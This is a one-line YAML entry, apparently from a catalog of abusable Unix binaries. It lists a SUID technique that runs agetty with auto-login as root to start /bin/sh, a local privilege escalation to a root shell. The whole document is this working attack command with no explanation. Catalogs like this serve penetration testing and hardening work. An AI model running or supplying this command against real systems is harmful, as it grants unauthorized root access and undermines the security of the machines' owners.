---
functions:
  suid:
    - code: ./agetty -o -p -l /bin/sh -a root tty
---
